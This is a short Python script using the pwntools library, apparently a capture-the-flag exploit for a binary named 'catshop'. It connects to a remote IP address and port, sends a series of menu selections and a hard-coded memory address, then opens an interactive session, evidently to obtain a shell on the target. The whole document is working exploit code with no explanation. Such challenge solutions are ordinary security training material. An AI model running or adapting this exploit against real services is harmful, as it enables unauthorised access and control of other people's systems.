from pwn import *
p = remote('211.117.60.76',8888)
#elf = ELF('./catshop')
#context(terminal = ['xterm', 'splitw'])
#gdb = attach(p)

p.send(p32(1))
p.send(p32(2))
p.send(p32(4))
p.send(p32(5))
p.send('\xb6\x88\x04\x08\x00')

p.send(p32(3))
p.send(p32(3))
p.send(p32(3))
p.send(p32(3))

p.interactive()
